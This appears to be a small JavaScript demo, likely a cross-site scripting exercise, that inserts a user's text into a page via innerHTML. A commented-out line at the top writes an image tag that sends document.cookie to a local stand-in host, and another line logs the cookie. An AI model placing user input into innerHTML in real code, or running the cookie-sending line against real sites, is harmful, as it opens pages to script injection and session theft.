// document.write("<img src='http://0.0.0.0:8080/?'+document.cookie+>")

console.log(document.cookie)

function foo(){
    var input = document.getElementById("userText").value
    var username = document.createElement("b")
    username.innerHTML = "Anonymous:"
    var br = document.createElement("p");
    br.innerHTML = input
    var foo = document.getElementById("fooBar");
    foo.append(username)
    foo.appendChild(br);
}